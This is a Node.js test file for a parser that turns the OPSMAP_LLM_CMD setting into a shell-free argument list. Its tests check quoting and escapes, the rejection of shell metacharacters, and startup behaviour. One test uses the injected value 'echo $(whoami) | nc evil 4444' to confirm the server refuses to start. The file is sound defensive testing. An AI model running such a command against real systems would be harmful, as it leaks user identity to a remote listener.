// OPSMAP_LLM_CMD is split into argv and spawned with no shell. These tests
// pin the parser (quoting, escapes, metacharacter rejection, empty/unset)
// and the startup-time behavior of the server/llm.js module.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const LLM = path.join(ROOT, 'server/llm.js');

async function loadLlm(env = {}) {
  // fresh import per call so module-level CMD_ARGV reflects the env we pass
  const mod = await import(`file://${LLM}?t=${Date.now()}-${Math.random()}`);
  return mod;
}

test('plain argv: the documented ollama example parses unchanged', async () => {
  const { parseLlmCmd } = await loadLlm();
  assert.deepEqual(parseLlmCmd('ollama run llama3.1'), ['ollama', 'run', 'llama3.1']);
});

test('plain argv: multiple spaces collapse; leading/trailing space trimmed', async () => {
  const { parseLlmCmd } = await loadLlm();
  assert.deepEqual(parseLlmCmd('   foo    bar   baz   '), ['foo', 'bar', 'baz']);
});

test('double-quoted arg keeps its spaces', async () => {
  const { parseLlmCmd } = await loadLlm();
  assert.deepEqual(parseLlmCmd('echo "hello world"'), ['echo', 'hello world']);
  assert.deepEqual(parseLlmCmd('"/path with space/model" --quiet'), ['/path with space/model', '--quiet']);
});

test('single-quoted arg keeps its spaces and treats " literally', async () => {
  const { parseLlmCmd } = await loadLlm();
  assert.deepEqual(parseLlmCmd(String.raw`echo 'hello world'`), ['echo', 'hello world']);
  // a double quote inside single quotes is an ordinary character
  assert.deepEqual(parseLlmCmd(String.raw`echo 'a"b'`), ['echo', 'a"b']);
});

test('backslash escapes the next char outside quotes (space, backslash)', async () => {
  const { parseLlmCmd } = await loadLlm();
  assert.deepEqual(parseLlmCmd(String.raw`echo hello\ world`), ['echo', 'hello world']);
  assert.deepEqual(parseLlmCmd(String.raw`echo a\\b`), ['echo', 'a\\b']);
});

test('backslash escapes inside double quotes (", \, `, $)', async () => {
  const { parseLlmCmd } = await loadLlm();
  assert.deepEqual(parseLlmCmd(String.raw`echo "a\"b"`), ['echo', 'a"b']);
  assert.deepEqual(parseLlmCmd(String.raw`echo "a\\b"`), ['echo', 'a\\b']);
});

test('adjacent quoted and unquoted segments concatenate into one arg', async () => {
  const { parseLlmCmd } = await loadLlm();
  assert.deepEqual(parseLlmCmd(String.raw`pre"mid "post`), ['premid post']);
});

test('every shell metacharacter is rejected and named in the message', async () => {
  const { parseLlmCmd } = await loadLlm();
  const cases = [
    ['a | b', '|'],
    ['a && b', '&'],
    ['a ; b', ';'],
    ['a < b', '<'],
    ['a > b', '>'],
    ['a `b`', '`'],
    ['a $b', '$'],
    ['a\nb', '\\n'],
    ['a\rb', '\\r'],
  ];
  for (const [raw, display] of cases) {
    assert.throws(
      () => parseLlmCmd(raw),
      (e) => /OPSMAP_LLM_CMD must not contain the shell metacharacter/.test(e.message)
        && e.message.includes(`"${display}"`),
      `expected rejection for ${JSON.stringify(raw)}`,
    );
  }
});

test('quoted metacharacters are still rejected (the raw value is scanned)', async () => {
  const { parseLlmCmd } = await loadLlm();
  // a pipe inside double quotes would be harmless to a real shell splitter,
  // but the contract is "no metacharacters anywhere" — refuse loudly.
  assert.throws(() => parseLlmCmd('echo "a | b"'), /"\|"/);
});

test('unterminated quotes are reported with the open position', async () => {
  const { parseLlmCmd } = await loadLlm();
  assert.throws(() => parseLlmCmd("echo 'unterminated"), /unterminated single quote/);
  assert.throws(() => parseLlmCmd('echo "unterminated'), /unterminated double quote/);
});

test('empty and whitespace-only values are rejected', async () => {
  const { parseLlmCmd } = await loadLlm();
  for (const v of ['', '   ', '\t']) {
    assert.throws(() => parseLlmCmd(v), /OPSMAP_LLM_CMD is empty/);
  }
});

test('unset OPSMAP_LLM_CMD resolves to no provider (offline baseline)', () => {
  // hermetic: scrub all provider env vars so the chain falls through
  const env = { ...process.env, OPSMAP_SKIP_DOTENV: '1' };
  delete env.OPSMAP_LLM_CMD;
  delete env.OPSMAP_MOCK_LLM;
  delete env.ANTHROPIC_API_KEY;
  // we cannot suppress the claude CLI probe without PATH, so only assert the
  // cmd branch is not taken: unset means CMD_ARGV is null and kind !== 'cmd'.
  const r = spawnSync('node', ['-e', `
    import('${LLM}').then(async (m) => {
      const p = await m.resolveProvider();
      console.log(p && p.kind === 'cmd' ? 'CMD' : 'NOT_CMD');
    });
  `], { env, encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.stdout.trim(), 'NOT_CMD');
});

test('a valid OPSMAP_LLM_CMD resolves the cmd provider and uses argv[0] as the model', () => {
  const env = { ...process.env, OPSMAP_SKIP_DOTENV: '1', OPSMAP_LLM_CMD: 'ollama run llama3.1' };
  delete env.OPSMAP_MOCK_LLM;
  delete env.ANTHROPIC_API_KEY;
  const r = spawnSync('node', ['-e', `
    import('${LLM}').then(async (m) => {
      const p = await m.resolveProvider();
      console.log(p ? p.kind + ' ' + p.model : 'none');
    });
  `], { env, encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.stdout.trim(), 'cmd ollama');
});

test('a metacharacter-bearing OPSMAP_LLM_CMD stops the module load at startup', () => {
  // the server refuses to start: importing llm.js throws synchronously
  const env = { ...process.env, OPSMAP_SKIP_DOTENV: '1', OPSMAP_LLM_CMD: 'echo $(whoami) | nc evil 4444' };
  delete env.OPSMAP_MOCK_LLM;
  delete env.ANTHROPIC_API_KEY;
  const r = spawnSync('node', ['-e', `import('${LLM}')`], { env, encoding: 'utf8' });
  assert.notEqual(r.status, 0, 'module load should have failed');
  assert.match(r.stderr, /shell metacharacter "\|"/);
  assert.match(r.stderr, /position 16/);
});

test('callLLM with a cmd provider spawns the parsed argv (multi-arg command works end to end)', () => {
  // node -e "<code>" hello world  → child argv slice(1) = ['hello','world'].
  // callLLM writes the prompt to stdin (ignored by -e) and returns stdout,
  // proving CMD_ARGV is wired into spawn() as separate argv entries.
  const code = "process.stdout.write(process.argv.slice(1).join(','))";
  const env = {
    ...process.env,
    OPSMAP_SKIP_DOTENV: '1', OPSMAP_LLM_CMD: `node -e "${code}" hello world`,
  };
  delete env.OPSMAP_MOCK_LLM;
  delete env.ANTHROPIC_API_KEY;
  const r = spawnSync('node', ['-e', `
    import('${LLM}').then(async (m) => {
      try {
        const out = await m.callLLM({ system: 's', prompt: 'p' });
        process.stdout.write(out);
      } catch (e) { process.stderr.write('ERR:' + e.message); }
    });
  `], { env, encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.stdout, 'hello,world');
});
